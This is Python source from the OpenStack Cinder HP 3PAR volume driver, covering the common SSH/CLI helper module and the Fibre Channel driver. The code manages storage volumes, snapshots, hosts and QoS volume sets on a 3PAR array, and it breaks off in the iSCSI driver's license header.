        if int(vol_size) == 0:
            capacity = MB  # default: 1GB
        else:
            capacity = vol_size * MB

        capacity = int(round(capacity / MiB))
        return capacity

    def _cli_run(self, cmd):
        """"""Runs a CLI command over SSH, without doing any result parsing.""""""
        LOG.debug(""SSH CMD = %s "" % cmd)

        (stdout, stderr) = self._run_ssh(cmd, False)

        # we have to strip out the input and exit lines
        tmp = stdout.split(""\r\n"")
        out = tmp[5:len(tmp) - 2]
        return out

    def _ssh_execute(self, ssh, cmd, check_exit_code=True):
        """"""We have to do this in order to get CSV output from the CLI command.

        We first have to issue a command to tell the CLI that we want the
        output to be formatted in CSV, then we issue the real command.
        """"""
        LOG.debug(_('Running cmd (SSH): %s'), cmd)

        channel = ssh.invoke_shell()
        stdin_stream = channel.makefile('wb')
        stdout_stream = channel.makefile('rb')
        stderr_stream = channel.makefile('rb')

        stdin_stream.write('''setclienv csvtable 1
%s
exit
''' % cmd)

        # stdin.write('process_input would go here')
        # stdin.flush()

        # NOTE(justinsb): This seems suspicious...
        # ...other SSH clients have buffering issues with this approach
        stdout = stdout_stream.read()
        stderr = stderr_stream.read()
        stdin_stream.close()
        stdout_stream.close()
        stderr_stream.close()

        exit_status = channel.recv_exit_status()

        # exit_status == -1 if no exit code was returned
        if exit_status != -1:
            LOG.debug(_('Result was %s') % exit_status)
            if check_exit_code and exit_status != 0:
                raise exception.ProcessExecutionError(exit_code=exit_status,
                                                      stdout=stdout,
                                                      stderr=stderr,
                                                      cmd=cmd)
        channel.close()
        return (stdout, stderr)

    def _run_ssh(self, cmd_list, check_exit=True, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            self.sshpool = utils.SSHPool(self.config.san_ip,
                                         self.config.san_ssh_port,
                                         self.config.ssh_conn_timeout,
                                         self.config.san_login,
                                         password=self.config.san_password,
                                         privatekey=
                                         self.config.san_private_key,
                                         min_size=
                                         self.config.ssh_min_pool_conn,
                                         max_size=
                                         self.config.ssh_max_pool_conn)
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return self._ssh_execute(ssh, command,
                                                 check_exit_code=check_exit)
                    except Exception as e:
                        LOG.error(e)
                        greenthread.sleep(randint(20, 500) / 100.0)
                msg = (_(""SSH Command failed after '%(total_attempts)r' ""
                         ""attempts : '%(command)s'"") %
                       {'total_attempts': total_attempts, 'command': command})
                raise paramiko.SSHException(msg)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error running ssh command: %s"") % command)

    def _delete_3par_host(self, hostname):
        self._cli_run(['removehost', hostname])

    def _create_3par_vlun(self, volume, hostname):
        out = self._cli_run(['createvlun', volume, 'auto', hostname])
        if out and len(out) > 1:
            if ""must be in the same domain"" in out[0]:
                err = out[0].strip()
                err = err + "" "" + out[1].strip()
                raise exception.Invalid3PARDomain(err=err)

    def _safe_hostname(self, hostname):
        """"""We have to use a safe hostname length for 3PAR host names.""""""
        try:
            index = hostname.index('.')
        except ValueError:
            # couldn't find it
            index = len(hostname)

        # we'll just chop this off for now.
        if index > 23:
            index = 23

        return hostname[:index]

    def _get_3par_host(self, hostname):
        out = self._cli_run(['showhost', '-verbose', hostname])
        LOG.debug(""OUTPUT = \n%s"" % (pprint.pformat(out)))
        host = {'id': None, 'name': None,
                'domain': None,
                'descriptors': {},
                'iSCSIPaths': [],
                'FCPaths': []}

        if out:
            err = out[0]
            if err == 'no hosts listed':
                msg = {'code': 'NON_EXISTENT_HOST',
                       'desc': ""HOST '%s' was not found"" % hostname}
                raise hpexceptions.HTTPNotFound(msg)

            # start parsing the lines after the header line
            for line in out[1:]:
                if line == '':
                    break
                tmp = line.split(',')
                paths = {}

                LOG.debug(""line = %s"" % (pprint.pformat(tmp)))
                host['id'] = tmp[0]
                host['name'] = tmp[1]

                portPos = tmp[4]
                LOG.debug(""portPos = %s"" % (pprint.pformat(portPos)))
                if portPos == '---':
                    portPos = None
                else:
                    port = portPos.split(':')
                    portPos = {'node': int(port[0]), 'slot': int(port[1]),
                               'cardPort': int(port[2])}

                paths['portPos'] = portPos

                # If FC entry
                if tmp[5] == 'n/a':
                    paths['wwn'] = tmp[3]
                    host['FCPaths'].append(paths)
                # else iSCSI entry
                else:
                    paths['name'] = tmp[3]
                    paths['ipAddr'] = tmp[5]
                    host['iSCSIPaths'].append(paths)

            # find the offset to the description stuff
            offset = 0
            for line in out:
                if line[:15] == '---------- Host':
                    break
                else:
                    offset += 1

            info = out[offset + 2]
            tmp = info.split(':')
            host['domain'] = tmp[1]

            info = out[offset + 4]
            tmp = info.split(':')
            host['descriptors']['location'] = tmp[1]

            info = out[offset + 5]
            tmp = info.split(':')
            host['descriptors']['ipAddr'] = tmp[1]

            info = out[offset + 6]
            tmp = info.split(':')
            host['descriptors']['os'] = tmp[1]

            info = out[offset + 7]
            tmp = info.split(':')
            host['descriptors']['model'] = tmp[1]

            info = out[offset + 8]
            tmp = info.split(':')
            host['descriptors']['contact'] = tmp[1]

            info = out[offset + 9]
            tmp = info.split(':')
            host['descriptors']['comment'] = tmp[1]

        return host

    def get_ports(self):
        # First get the active FC ports
        out = self._cli_run(['showport'])

        # strip out header
        # N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,
        # Protocol,Label,Partner,FailoverState
        out = out[1:len(out) - 2]

        ports = {'FC': [], 'iSCSI': {}}
        for line in out:
            tmp = line.split(',')

            if tmp:
                if tmp[1] == 'target' and tmp[2] == 'ready':
                    if tmp[6] == 'FC':
                        ports['FC'].append(tmp[4])

        # now get the active iSCSI ports
        out = self._cli_run(['showport', '-iscsi'])

        # strip out header
        # N:S:P,State,IPAddr,Netmask,Gateway,
        # TPGT,MTU,Rate,DHCP,iSNS_Addr,iSNS_Port
        out = out[1:len(out) - 2]
        for line in out:
            tmp = line.split(',')

            if tmp and len(tmp) > 2:
                if tmp[1] == 'ready':
                    ports['iSCSI'][tmp[2]] = {}

        # now get the nsp and iqn
        result = self._cli_run(['showport', '-iscsiname'])
        if result:
            # first line is header
            # nsp, ip,iqn
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 2:
                    if info[1] in ports['iSCSI']:
                        nsp = info[0]
                        ip_addr = info[1]
                        iqn = info[2]
                        ports['iSCSI'][ip_addr] = {'nsp': nsp,
                                                   'iqn': iqn
                                                   }

        LOG.debug(""PORTS = %s"" % pprint.pformat(ports))
        return ports

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_volume_stats()

        return self.stats

    def _update_volume_stats(self):
        # const to convert MiB to GB
        const = 0.0009765625

        # storage_protocol and volume_backend_name are
        # set in the child classes
        stats = {'driver_version': '1.0',
                 'free_capacity_gb': 'unknown',
                 'reserved_percentage': 0,
                 'storage_protocol': None,
                 'total_capacity_gb': 'unknown',
                 'QoS_support': True,
                 'vendor_name': 'Hewlett-Packard',
                 'volume_backend_name': None}

        try:
            cpg = self.client.getCPG(self.config.hp3par_cpg)
            if 'limitMiB' not in cpg['SDGrowth']:
                total_capacity = 'infinite'
                free_capacity = 'infinite'
            else:
                total_capacity = int(cpg['SDGrowth']['limitMiB'] * const)
                free_capacity = int((cpg['SDGrowth']['limitMiB'] -
                                    cpg['UsrUsage']['usedMiB']) * const)

            stats['total_capacity_gb'] = total_capacity
            stats['free_capacity_gb'] = free_capacity
        except hpexceptions.HTTPNotFound:
            err = (_(""CPG (%s) doesn't exist on array"")
                   % self.config.hp3par_cpg)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        self.stats = stats

    def create_vlun(self, volume, host):
        """"""Create a VLUN.

        In order to export a volume on a 3PAR box, we have to create a VLUN.
        """"""
        volume_name = self._get_3par_vol_name(volume['id'])
        self._create_3par_vlun(volume_name, host['name'])
        return self.client.getVLUN(volume_name)

    def delete_vlun(self, volume, hostname):
        volume_name = self._get_3par_vol_name(volume['id'])
        vlun = self.client.getVLUN(volume_name)
        self.client.deleteVLUN(volume_name, vlun['lun'], hostname)
        self._delete_3par_host(hostname)

    def _get_volume_type(self, type_id):
        ctxt = context.get_admin_context()
        return volume_types.get_volume_type(ctxt, type_id)

    def _get_key_value(self, hp3par_keys, key, default=None):
        if hp3par_keys is not None and key in hp3par_keys:
            return hp3par_keys[key]
        else:
            return default

    def _get_qos_value(self, qos, key, default=None):
        if key in qos:
            return qos[key]
        else:
            return default

    def _get_qos_by_volume_type(self, volume_type):
        qos = {}
        specs = volume_type.get('extra_specs')
        for key, value in specs.iteritems():
            if 'qos:' in key:
                fields = key.split(':')
                key = fields[1]
            if key in self.hp_qos_keys:
                qos[key] = int(value)
        return qos

    def _get_keys_by_volume_type(self, volume_type):
        hp3par_keys = {}
        specs = volume_type.get('extra_specs')
        for key, value in specs.iteritems():
            if ':' in key:
                fields = key.split(':')
                key = fields[1]
            if key in self.hp3par_valid_keys:
                hp3par_keys[key] = value
        return hp3par_keys

    def _set_qos_rule(self, qos, vvs_name):
        max_io = self._get_qos_value(qos, 'maxIOPS')
        max_bw = self._get_qos_value(qos, 'maxBWS')
        cli_qos_string = """"
        if max_io is not None:
            cli_qos_string += ('-io %s ' % max_io)
        if max_bw is not None:
            cli_qos_string += ('-bw %sM ' % max_bw)
        self._cli_run(['setqos', '%svvset:%s' % (cli_qos_string, vvs_name)])

    def _add_volume_to_volume_set(self, volume, volume_name,
                                  cpg, vvs_name, qos):
        if vvs_name is not None:
            # Admin has set a volume set name to add the volume to
            self._cli_run(['createvvset', '-add', vvs_name, volume_name])
        else:
            vvs_name = self._get_3par_vvs_name(volume['id'])
            domain = self.get_domain(cpg)
            self._cli_run(['createvvset', '-domain', domain, vvs_name])
            self._set_qos_rule(qos, vvs_name)
            self._cli_run(['createvvset', '-add', vvs_name, volume_name])

    def _remove_volume_set(self, vvs_name):
        # Must first clear the QoS rules before removing the volume set
        self._cli_run(['setqos', '-clear', 'vvset:%s' % (vvs_name)])
        self._cli_run(['removevvset', '-f', vvs_name])

    def _remove_volume_from_volume_set(self, volume_name, vvs_name):
        self._cli_run(['removevvset', '-f', vvs_name, volume_name])

    def get_cpg(self, volume, allowSnap=False):
        volume_name = self._get_3par_vol_name(volume['id'])
        vol = self.client.getVolume(volume_name)
        if 'userCPG' in vol:
            return vol['userCPG']
        elif allowSnap:
            return vol['snapCPG']
        return None

    def _get_3par_vol_comment(self, volume_name):
        vol = self.client.getVolume(volume_name)
        if 'comment' in vol:
            return vol['comment']
        return None

    def get_persona_type(self, volume, hp3par_keys=None):
        default_persona = self.valid_persona_values[0]
        type_id = volume.get('volume_type_id', None)
        volume_type = None
        if type_id is not None:
            volume_type = self._get_volume_type(type_id)
            if hp3par_keys is None:
                hp3par_keys = self._get_keys_by_volume_type(volume_type)
        persona_value = self._get_key_value(hp3par_keys, 'persona',
                                            default_persona)
        if persona_value not in self.valid_persona_values:
            err = _(""Must specify a valid persona %(valid)s, ""
                    ""value '%(persona)s' is invalid."") % \
                   ({'valid': self.valid_persona_values,
                     'persona': persona_value})
            raise exception.InvalidInput(reason=err)
        # persona is set by the id so remove the text and return the id
        # i.e for persona '1 - Generic' returns 1
        persona_id = persona_value.split(' ')
        return persona_id[0]

    def get_volume_settings_from_type(self, volume):
        cpg = None
        snap_cpg = None
        volume_type = None
        vvs_name = None
        hp3par_keys = {}
        qos = {}
        type_id = volume.get('volume_type_id', None)
        if type_id is not None:
            volume_type = self._get_volume_type(type_id)
            hp3par_keys = self._get_keys_by_volume_type(volume_type)
            vvs_name = self._get_key_value(hp3par_keys, 'vvs')
            if vvs_name is None:
                qos = self._get_qos_by_volume_type(volume_type)

        cpg = self._get_key_value(hp3par_keys, 'cpg',
                                  self.config.hp3par_cpg)
        if cpg is not self.config.hp3par_cpg:
            # The cpg was specified in a volume type extra spec so it
            # needs to be validiated that it's in the correct domain.
            self.validate_cpg(cpg)
            # Also, look to see if the snap_cpg was specified in volume
            # type extra spec, if not use the extra spec cpg as the
            # default.
            snap_cpg = self._get_key_value(hp3par_keys, 'snap_cpg', cpg)
        else:
            # default snap_cpg to hp3par_cpg_snap if it's not specified
            # in the volume type extra specs.
            snap_cpg = self.config.hp3par_cpg_snap
            # if it's still not set or empty then set it to the cpg
            # specified in the cinder.conf file.
            if not self.config.hp3par_cpg_snap:
                snap_cpg = cpg

        # if provisioning is not set use thin
        default_prov = self.valid_prov_values[0]
        prov_value = self._get_key_value(hp3par_keys, 'provisioning',
                                         default_prov)
        # check for valid provisioning type
        if prov_value not in self.valid_prov_values:
            err = _(""Must specify a valid provisioning type %(valid)s, ""
                    ""value '%(prov)s' is invalid."") % \
                   ({'valid': self.valid_prov_values,
                     'prov': prov_value})
            raise exception.InvalidInput(reason=err)

        tpvv = True
        if prov_value == ""full"":
            tpvv = False

        # check for valid persona even if we don't use it until
        # attach time, this will give the end user notice that the
        # persona type is invalid at volume creation time
        self.get_persona_type(volume, hp3par_keys)

        return {'cpg': cpg, 'snap_cpg': snap_cpg,
                'vvs_name': vvs_name, 'qos': qos,
                'tpvv': tpvv, 'volume_type': volume_type}

    def create_volume(self, volume):
        LOG.debug(""CREATE VOLUME (%s : %s %s)"" %
                  (volume['display_name'], volume['name'],
                   self._get_3par_vol_name(volume['id'])))
        try:
            comments = {'volume_id': volume['id'],
                        'name': volume['name'],
                        'type': 'OpenStack'}

            name = volume.get('display_name', None)
            if name:
                comments['display_name'] = name

            # get the options supported by volume types
            type_info = self.get_volume_settings_from_type(volume)
            volume_type = type_info['volume_type']
            vvs_name = type_info['vvs_name']
            qos = type_info['qos']
            cpg = type_info['cpg']
            snap_cpg = type_info['snap_cpg']
            tpvv = type_info['tpvv']

            type_id = volume.get('volume_type_id', None)
            if type_id is not None:
                comments['volume_type_name'] = volume_type.get('name')
                comments['volume_type_id'] = type_id
                if vvs_name is not None:
                    comments['vvs'] = vvs_name
                else:
                    comments['qos'] = qos

            extras = {'comment': json.dumps(comments),
                      'snapCPG': snap_cpg,
                      'tpvv': tpvv}

            capacity = self._capacity_from_size(volume['size'])
            volume_name = self._get_3par_vol_name(volume['id'])
            self.client.createVolume(volume_name, cpg, capacity, extras)
            if qos or vvs_name is not None:
                try:
                    self._add_volume_to_volume_set(volume, volume_name,
                                                   cpg, vvs_name, qos)
                except Exception as ex:
                    # Delete the volume if unable to add it to the volume set
                    self.client.deleteVolume(volume_name)
                    LOG.error(str(ex))
                    raise exception.CinderException(ex.get_description())
        except hpexceptions.HTTPConflict:
            raise exception.Duplicate(_(""Volume (%s) already exists on array"")
                                      % volume_name)
        except hpexceptions.HTTPBadRequest as ex:
            LOG.error(str(ex))
            raise exception.Invalid(ex.get_description())
        except exception.InvalidInput as ex:
            LOG.error(str(ex))
            raise ex
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex.get_description())

    def _copy_volume(self, src_name, dest_name, cpg=None, snap_cpg=None,
                     tpvv=True):
        # Virtual volume sets are not supported with the -online option
        cmd = ['createvvcopy', '-p', src_name, '-online']
        if snap_cpg:
            cmd.extend(['-snp_cpg', snap_cpg])
        if tpvv:
            cmd.append('-tpvv')
        if cpg:
            cmd.append(cpg)
        cmd.append(dest_name)
        LOG.debug('Creating clone of a volume with %s' % cmd)
        self._cli_run(cmd)

    def get_next_word(self, s, search_string):
        """"""Return the next word.

        Search 's' for 'search_string', if found return the word preceding
        'search_string' from 's'.
        """"""
        word = re.search(search_string.strip(' ') + ' ([^ ]*)', s)
        return word.groups()[0].strip(' ')

    def _get_3par_vol_comment_value(self, vol_comment, key):
        comment_dict = dict(ast.literal_eval(vol_comment))
        if key in comment_dict:
            return comment_dict[key]
        return None

    def create_cloned_volume(self, volume, src_vref):
        try:
            orig_name = self._get_3par_vol_name(volume['source_volid'])
            vol_name = self._get_3par_vol_name(volume['id'])

            type_info = self.get_volume_settings_from_type(volume)

            # make the 3PAR copy the contents.
            # can't delete the original until the copy is done.
            self._copy_volume(orig_name, vol_name, cpg=type_info['cpg'],
                              snap_cpg=type_info['snap_cpg'],
                              tpvv=type_info['tpvv'])
            return None
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex)

    def _get_vvset_from_3par(self, volume_name):
        """"""Get Virtual Volume Set from 3PAR.

        The only way to do this currently is to try and delete the volume
        to get the error message.

        NOTE(walter-boring): don't call this unless you know the volume is
        already in a vvset!
        """"""
        cmd = ['removevv', '-f', volume_name]
        LOG.debug(""Issuing remove command to find vvset name %s"" % cmd)
        out = self._cli_run(cmd)
        vvset_name = None
        if out and len(out) > 1:
            if out[1].startswith(""Attempt to delete ""):
                words = out[1].split("" "")
                vvset_name = words[len(words) - 1]

        return vvset_name

    def delete_volume(self, volume):
        try:
            volume_name = self._get_3par_vol_name(volume['id'])
            # Try and delete the volume, it might fail here because
            # the volume is part of a volume set which will have the
            # volume set name in the error.
            try:
                self.client.deleteVolume(volume_name)
            except hpexceptions.HTTPConflict as ex:
                if ex.get_code() == 34:
                    # This is a special case which means the
                    # volume is part of a volume set.
                    vvset_name = self._get_vvset_from_3par(volume_name)
                    LOG.debug(""Returned vvset_name = %s"" % vvset_name)
                    if vvset_name is not None and \
                       vvset_name.startswith('vvs-'):
                        # We have a single volume per volume set, so
                        # remove the volume set.
                        self._remove_volume_set(
                            self._get_3par_vvs_name(volume['id']))
                    elif vvset_name is not None:
                        # We have a pre-defined volume set just remove the
                        # volume and leave the volume set.
                        self._remove_volume_from_volume_set(volume_name,
                                                            vvset_name)
                    self.client.deleteVolume(volume_name)
                else:
                    raise ex

        except hpexceptions.HTTPNotFound as ex:
            # We'll let this act as if it worked
            # it helps clean up the cinder entries.
            LOG.error(str(ex))
        except hpexceptions.HTTPForbidden as ex:
            LOG.error(str(ex))
            raise exception.NotAuthorized(ex.get_description())
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex)

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        LOG.debug(""Create Volume from Snapshot\n%s\n%s"" %
                  (pprint.pformat(volume['display_name']),
                   pprint.pformat(snapshot['display_name'])))

        if snapshot['volume_size'] != volume['size']:
            err = ""You cannot change size of the volume.  It must ""
            ""be the same as the snapshot.""
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            volume_name = self._get_3par_vol_name(volume['id'])

            extra = {'volume_id': volume['id'],
                     'snapshot_id': snapshot['id']}

            volume_type = None
            type_id = volume.get('volume_type_id', None)
            vvs_name = None
            qos = {}
            hp3par_keys = {}
            if type_id is not None:
                volume_type = self._get_volume_type(type_id)
                hp3par_keys = self._get_keys_by_volume_type(volume_type)
                vvs_name = self._get_key_value(hp3par_keys, 'vvs')
                if vvs_name is None:
                    qos = self._get_qos_by_volume_type(volume_type)

            name = volume.get('display_name', None)
            if name:
                extra['display_name'] = name

            description = volume.get('display_description', None)
            if description:
                extra['description'] = description

            optional = {'comment': json.dumps(extra),
                        'readOnly': False}

            self.client.createSnapshot(volume_name, snap_name, optional)
            if qos or vvs_name is not None:
                cpg = self._get_key_value(hp3par_keys, 'cpg',
                                          self.config.hp3par_cpg)
                try:
                    self._add_volume_to_volume_set(volume, volume_name,
                                                   cpg, vvs_name, qos)
                except Exception as ex:
                    # Delete the volume if unable to add it to the volume set
                    self.client.deleteVolume(volume_name)
                    LOG.error(str(ex))
                    raise exception.CinderException(ex.get_description())
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex.get_description())

    def create_snapshot(self, snapshot):
        LOG.debug(""Create Snapshot\n%s"" % pprint.pformat(snapshot))

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            vol_name = self._get_3par_vol_name(snapshot['volume_id'])

            extra = {'volume_name': snapshot['volume_name']}
            vol_id = snapshot.get('volume_id', None)
            if vol_id:
                extra['volume_id'] = vol_id

            try:
                extra['display_name'] = snapshot['display_name']
            except AttributeError:
                pass

            try:
                extra['description'] = snapshot['display_description']
            except AttributeError:
                pass

            optional = {'comment': json.dumps(extra),
                        'readOnly': True}
            if self.config.hp3par_snapshot_expiration:
                optional['expirationHours'] = (
                    self.config.hp3par_snapshot_expiration)

            if self.config.hp3par_snapshot_retention:
                optional['retentionHours'] = (
                    self.config.hp3par_snapshot_retention)

            self.client.createSnapshot(snap_name, vol_name, optional)
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()

    def delete_snapshot(self, snapshot):
        LOG.debug(""Delete Snapshot\n%s"" % pprint.pformat(snapshot))

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            self.client.deleteVolume(snap_name)
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound as ex:
            LOG.error(str(ex))

    def _get_3par_hostname_from_wwn_iqn(self, wwns_iqn):
        out = self._cli_run(['showhost', '-d'])
        # wwns_iqn may be a list of strings or a single
        # string. So, if necessary, create a list to loop.
        if not isinstance(wwns_iqn, list):
            wwn_iqn_list = [wwns_iqn]
        else:
            wwn_iqn_list = wwns_iqn

        for wwn_iqn in wwn_iqn_list:
            for showhost in out:
                if (wwn_iqn.upper() in showhost.upper()):
                    return showhost.split(',')[1]

    def terminate_connection(self, volume, hostname, wwn_iqn):
        """"""Driver entry point to unattach a volume from an instance.""""""
        try:
            # does 3par know this host by a different name?
            if hostname in self.hosts_naming_dict:
                hostname = self.hosts_naming_dict.get(hostname)
            self.delete_vlun(volume, hostname)
            return
        except hpexceptions.HTTPNotFound as e:
            if 'host does not exist' in e.get_description():
                # use the wwn to see if we can find the hostname
                hostname = self._get_3par_hostname_from_wwn_iqn(wwn_iqn)
                # no 3par host, re-throw
                if (hostname is None):
                    raise
            else:
            # not a 'host does not exist' HTTPNotFound exception, re-throw
                raise

        #try again with name retrieved from 3par
        self.delete_vlun(volume, hostname)

    def parse_create_host_error(self, hostname, out):
        search_str = ""already used by host ""
        if search_str in out[1]:
            #host exists, return name used by 3par
            hostname_3par = self.get_next_word(out[1], search_str)
            self.hosts_naming_dict[hostname] = hostname_3par
            return hostname_3par
/n/n/ncinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR Fibre Channel Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver
""""""

from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)


class HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):
    """"""OpenStack Fibre Channel driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware,
              copy volume <--> Image.
    """"""

    def __init__(self, *args, **kwargs):
        super(HP3PARFCDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password',
                          'san_ip', 'san_login', 'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'FC'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()
        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()
        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        The  driver returns a driver_volume_type of 'fibre_channel'.
        The target_wwn can be a single entry or a list of wwns that
        correspond to the list of remote wwn(s) that will export the volume.
        Example return values:

            {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': '1234567890123',
                }
            }

            or

             {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': ['1234567890123', '0987654321321'],
                }
            }


        Steps to export a volume on 3PAR
          * Create a host on the 3par with the target wwn
          * Create a VLUN for that HOST with the volume we want to export.

        """"""
        self.common.client_login()
        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        ports = self.common.get_ports()

        self.common.client_logout()
        info = {'driver_volume_type': 'fibre_channel',
                'data': {'target_lun': vlun['lun'],
                         'target_discovered': True,
                         'target_wwn': ports['FC']}}
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['wwpns'])
        self.common.client_logout()

    def _create_3par_fibrechan_host(self, hostname, wwns, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same wwn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        command = ['createhost', '-persona', persona_id, '-domain', domain,
                   hostname]
        for wwn in wwns:
            command.append(wwn)

        out = self.common._cli_run(command)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)

        return hostname

    def _modify_3par_fibrechan_host(self, hostname, wwns):
        # when using -add, you can not send the persona or domain options
        command = ['createhost', '-add', hostname]
        for wwn in wwns:
            command.append(wwn)

        out = self.common._cli_run(command)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['FCPaths']:
                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound as ex:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_fibrechan_host(hostname,
                                                        connector['wwpns'],
                                                        domain,
                                                        persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/ncinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
